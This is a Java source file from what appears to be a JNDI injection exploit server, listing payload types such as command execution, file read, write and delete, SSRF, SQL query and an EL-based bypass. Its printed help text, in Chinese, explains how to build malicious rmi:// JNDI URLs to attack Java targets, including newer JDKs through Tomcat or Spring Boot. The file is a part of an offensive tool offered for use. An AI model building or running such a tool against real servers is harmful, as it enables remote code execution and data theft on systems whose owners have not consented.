package org.su18.utils;


import static org.su18.server.ServerStart.addr;
import static org.su18.server.ServerStart.rmiPort;

import java.util.HashMap;
import java.util.Map;


public class Mapper {


	public final static Map<String, String> reflect = new HashMap<>();

	static {

		reflect.put("Command", "Command");
		reflect.put("DirList", "DirList");
		reflect.put("FileRead", "FileRead");
		reflect.put("FileWrite", "FileWrite");
		reflect.put("FileDelete", "FileDelete");
		reflect.put("SSRF", "SSRF");
		reflect.put("SQLQuery", "SQLQuery");
		reflect.put("DataSourceHack", "DataSourceHack");
		reflect.put("BasicInfo", "BasicInfo");
		reflect.put("BypassByEL", "BypassByEL");

		Logger.print("                  _ _  _ ___ ___ \n" +
				"               _ | | \\| |   \\_ _|\n" +
				"              | || | .` | |) | | \n" +
				"               \\__/|_|\\_|___/___|\n" +
				"              1.0 http://su18.org \n");


		Logger.print("------------------- 分割线 ---------------------");
		Logger.print("-工具用法：");
		Logger.print("[协议]://" + "[IP 地址]" + ":[端口]/" + "[Payload 类型]" + "[JDK 版本]");
		Logger.print("例如：使用 rmi 协议，命令执行，目标 JDK 1.8:");
		Logger.print("恶意 JNDI 为：rmi://" + addr + ":" + rmiPort + "/" + "Command8");
		Logger.print("高版本 JDK 需要 trustURLCodebase 为 true");
		Logger.print("如果 classpath 中存在 Tomcat 8+ 或 SpringBoot 1.2.x+ ");
		Logger.print("-可以使用：");
		Logger.print("rmi://" + addr + ":" + rmiPort + "/BypassByEL");
		Logger.print("原项目：https://github.com/welk1n/JNDI-Injection-Exploit");
	}
}

